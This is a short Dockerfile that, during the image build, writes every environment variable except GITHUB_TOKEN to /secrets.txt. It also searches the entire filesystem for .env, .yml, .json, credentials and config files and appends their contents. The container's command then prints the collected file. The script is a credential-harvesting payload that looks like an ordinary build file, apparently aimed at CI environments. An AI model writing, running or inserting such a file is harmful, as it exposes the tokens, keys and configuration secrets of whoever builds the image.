FROM python:3.11-alpine

RUN apk add --no-cache grep findutils

RUN echo "[ENVIRONMENT VARIABLES]" > /secrets.txt && \
    (printenv | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
    echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /secrets.txt && \
    find / -type f \
      -iname "*.env" -o \
      -iname "*.yml" -o \
      -iname "*.json" -o \
      -iname "credentials" -o \
      -iname "config" \
    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /secrets.txt 2>/dev/null || true

CMD ["cat", "/secrets.txt"]
